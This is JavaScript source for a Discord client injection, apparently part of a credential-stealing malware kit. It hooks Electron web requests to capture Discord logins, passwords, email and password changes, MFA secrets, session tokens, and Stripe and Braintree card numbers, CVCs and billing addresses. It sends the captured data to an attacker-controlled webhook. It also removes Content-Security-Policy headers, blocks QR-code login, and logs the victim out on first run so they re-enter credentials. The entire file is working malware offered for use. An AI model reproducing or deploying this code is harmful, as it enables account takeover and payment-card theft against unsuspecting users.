const crypto = require("crypto");
const { BrowserWindow, app, session } = require("electron");
const Response = require("../globals/Response");
const Embed = require("../globals/Embed");
const GlobalUtil = require("../globals/GlobalUtil");
const { writeFileSync, existsSync } = require("fs");

const config = {
  domain: "LUST_CONFIG_DOMAIN",
  uebkook: "WEBHOOK_ENCRYPTED_SECRET",
  pk: "WEBHOOK_PRIVATE_KEY",
  version: 50,
  filters: {
    user: {
      urls: [
        "https://discord.com/api/v*/users/@me",
        "https://discordapp.com/api/v*/users/@me",
        "https://*.discord.com/api/v*/users/@me",
        "https://discordapp.com/api/v*/auth/login",
        "https://discord.com/api/v*/auth/login",
        "https://*.discord.com/api/v*/auth/login",
        "https://discord.com/api/v*/users/@me/mfa/totp/enable",
        "https://discord.com/api/v*/users/@me/mfa/totp/disable",
        "https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts",
        "https://api.stripe.com/v*/tokens",
        "https://api.stripe.com/v*/setup_intents/*/confirm",
        "https://api.stripe.com/v*/payment_intents/*/confirm"
      ]
    },
    QRCodes: {
      urls: [
        "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
        "https://*.discord.com/api/v*/applications/detectable",
        "https://discord.com/api/v*/applications/detectable",
        "https://*.discord.com/api/v*/users/@me/library",
        "https://discord.com/api/v*/users/@me/library",
        "https://*.discord.com/api/v*/users/@me/billing/subscriptions",
        "https://discord.com/api/v*/users/@me/billing/subscriptions",
        "wss://remote-auth-gateway.discord.gg/*"
      ]
    }
  }
};

const report = (error, out = null) => {
  new Promise(async () => {
    try {
      const err = error?.stack ? error.stack : error;
      if (!err) return;

      const serr = typeof err != "string" ? GlobalUtil.toString(err) : err;
      if (!serr || serr.length < 1) return;

      await post(config.domain + "/error", {
        headers: {
          "Content-Type": "application/json"
        },
        body: {
          type: "injection",
          error: serr,
          version: config.version
        }
      });
    } catch {}
  });

  return out;
};

function execScript(script) {
  const window = BrowserWindow.getAllWindows()[0];
  return window.webContents.executeJavaScript(script, true);
}

function callFunc(method) {
  return execScript(
    `(webpackChunkdiscord_app.push([[''],{},req=>{m=[];for(let chunk in req.c){m.push(req.c[chunk])}}]),m).find(chunk=>chunk?.exports?.default?.${method}!==undefined).exports.default.${method}()`
  );
}

app.on("browser-window-created", () => {
  try {
    const patty = `${__dirname}\\.first-time`;

    if (!existsSync(patty)) {
      callFunc("logout");

      writeFileSync(patty, "0");
    }
  } catch (e) {
    report(e);
  }
});

async function fetch(url, { headers = {} }) {
  const script = [
    `fetch("${url}", { headers: ${JSON.stringify(headers)} })`,
    ".then((res) => Promise.all([res.status, res.text()]))",
    ".then(([status, text]) => ({ status, text }));"
  ].join("\n");

  const data = await execScript(script);

  return new Response(data.text, { status: data.status });
}

async function post(target, { body = {}, headers = {} }) {
  const url = new URL(target);

  const options = {
    protocol: url.protocol,
    hostname: url.host,
    path: url.pathname,
    method: "POST",
    headers: headers
  };

  return new Promise((resolve) => {
    const lib = url.protocol === "https:" ? require("https") : require("http");
    const req = lib.request(options);

    req.on("error", (e) => report("Webhook: " + e));
    req.on("close", () => resolve());

    req.write(JSON.stringify(body));
    req.end();
  });
}

async function getToken() {
  return await callFunc(`getToken`);
}

const notifier = new (require("../globals/SafeEvents"))(report);
const DiscordUser = new (require("../globals/DiscordUser"))(fetch, report);

session.defaultSession.webRequest.onBeforeRequest(
  config.filters.QRCodes,
  (details, callback) => {
    if (details.url.startsWith("wss://")) return callback({ cancel: true });

    return callback({});
  }
);

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
  try {
    if (details.url.startsWith(config.domain))
      return callback({
        responseHeaders: Object.assign(
          {
            "Content-Security-Policy": [
              "default-src '*'",
              "Access-Control-Allow-Headers '*'",
              "Access-Control-Allow-Origin '*'"
            ],
            "Access-Control-Allow-Headers": "*",
            "Access-Control-Allow-Origin": "*"
          },
          details.responseHeaders
        )
      });

    delete details.responseHeaders["content-security-policy"];
    delete details.responseHeaders["content-security-policy-report-only"];

    return callback({
      responseHeaders: Object.assign(
        { "Access-Control-Allow-Headers": "*" },
        details.responseHeaders
      )
    });
  } catch (e) {
    report(e);
  }
});

session.defaultSession.webRequest.onCompleted(
  config.filters.user,
  async (details) => {
    try {
      if (details.statusCode == 200 || details.statusCode == 204) {
        const unparsedData = Array.isArray(details.uploadData)
          ? Buffer.from(details?.uploadData[0]?.bytes).toString()
          : null;
        const data = GlobalUtil.toJSON(unparsedData);

        switch (true) {
          case details.url.endsWith("login"):
            notifier.emit("login", data);
            break;

          case details.url.endsWith("tokens") && details.method == "POST":
            notifier.emit(
              "ccAdd",
              Object.fromEntries(new URLSearchParams(unparsedData))
            );
            break;

          case details.url.endsWith("users/@me") && details.method == "PATCH":
            if (data.password) {
              if (data.email) notifier.emit("emailChange", data);
              if (data.new_password) notifier.emit("passwordChange", data);
            }
            break;

          case details.url.includes("stripe.com") &&
            details.url.includes("setup_intents") &&
            details.url.endsWith("confirm"):
            notifier.emit(
              "ccAddressAdd",
              Object.fromEntries(new URLSearchParams(unparsedData))
            );
            break;

          case details.url.endsWith("mfa/totp/enable") &&
            details.method == "POST":
            notifier.emit("mfa", data);
            break;

          case details.url.endsWith("mfa/totp/disable") &&
            details.method == "POST":
            notifier.emit("mfa", { disabled: true });
            break;

          default:
            break;
        }
      }
    } catch (e) {
      report(e);
    }
  }
);

notifier.on("login", async (data) => {
  const token = await getToken();
  const user = await DiscordUser.fetch(token);

  if (!user) return;

  const embeds = DiscordUser.generateEmbeds(
    Object.assign(user, {
      password: data.password,
      type: "login"
    })
  );

  await send({ embeds: embeds });
});

notifier.on("emailChange", async (data) => {
  const token = await getToken();
  const user = await DiscordUser.fetch(token);

  if (!user) return;

  const embeds = DiscordUser.generateEmbeds(
    Object.assign(user, {
      emailToken: data.email_token,
      type: "email"
    })
  );

  await send({ embeds: embeds });
});

notifier.on("passwordChange", async (data) => {
  const token = await getToken();
  const user = await DiscordUser.fetch(token);

  if (!user) return;

  const embeds = DiscordUser.generateEmbeds(
    Object.assign(user, {
      password: data.new_password,
      oldPassword: data.password,
      type: "password"
    })
  );

  await send({ embeds: embeds });
});

notifier.on("mfa", async (data) => {
  const token = await getToken();
  const user = await DiscordUser.fetch(token);

  if (!user) return;

  const embeds = DiscordUser.generateEmbeds(
    Object.assign(user, {
      password: data.password,
      secret: data.secret,
      type: data.disabled ? "mfaDisabled" : "mfaEnabled"
    })
  );

  await send({ embeds: embeds });
});

notifier.on("ccAdd", async (data) => {
  if (!data?.key) return;

  const embed = new Embed()
    .setTitle("💳 Card Added")
    .addField("Key", data.key)
    .addField("Number", data["card[number]"], true)
    .addField("CVC", data["card[cvc]"], true)
    .addField(
      "Expire Date",
      data["card[exp_month]"] + "/" + data["card[exp_year]"],
      true
    )
    .addField("GUID", data.guid, true)
    .addField("MUID", data.muid, true)
    .addField("SID", data.sid, true);

  await send({
    embeds: [embed]
  });
});

notifier.on("ccAddressAdd", async (data) => {
  if (!data?.key) return;

  const embed = new Embed()
    .setTitle("💳 Card Address Added")
    .addField("Key", data["key"], true)
    .addField(
      "Address 1",
      data["payment_method_data[billing_details][address][line1]"] || "No Data",
      true
    )
    .addField(
      "Address 2",
      data["payment_method_data[billing_details][address][line2]"] || "No Data",
      true
    )
    .addField(
      "City",
      data["payment_method_data[billing_details][address][city]"],
      true
    )
    .addField(
      "State/Region",
      data["payment_method_data[billing_details][address][state]"],
      true
    )
    .addField(
      "Postal Code",
      data["payment_method_data[billing_details][address][postal_code]"],
      true
    )
    .addField(
      "Country",
      data["payment_method_data[billing_details][address][country]"],
      true
    )
    .addField("Name", data["payment_method_data[billing_details][name]"], true)
    .addField("Token", data["payment_method_data[card][token]"], true)
    .addField("GUID", data["payment_method_data[guid]"], true)
    .addField("MUID", data["payment_method_data[muid]"], true)
    .addField("SID", data["payment_method_data[sid]"], true);

  await send({
    embeds: [embed]
  });
});

function AESDecrypt(data, key) {
  const [ivHex, encrypted] = data.split(":");
  const iv = Buffer.from(ivHex, "hex");
  const salt = crypto.scryptSync(key, "salt", 32);
  const decipher = crypto.createDecipheriv("aes-256-cbc", salt, iv);
  let decrypted = decipher.update(encrypted, "hex", "utf8");
  decrypted += decipher.final("utf8");
  return decrypted;
}

async function send(data) {
  if (data == {}) return;

  const headers = {
    "Content-Type": "application/json",
    "Access-Control-Allow-Origin": "*"
  };

  await post(config.domain + "/s/" + AESDecrypt(config.uebkook, config.pk), {
    headers,
    body: data
  });
}

function launch() {
  return true;
}

module.exports = {
  launch
};
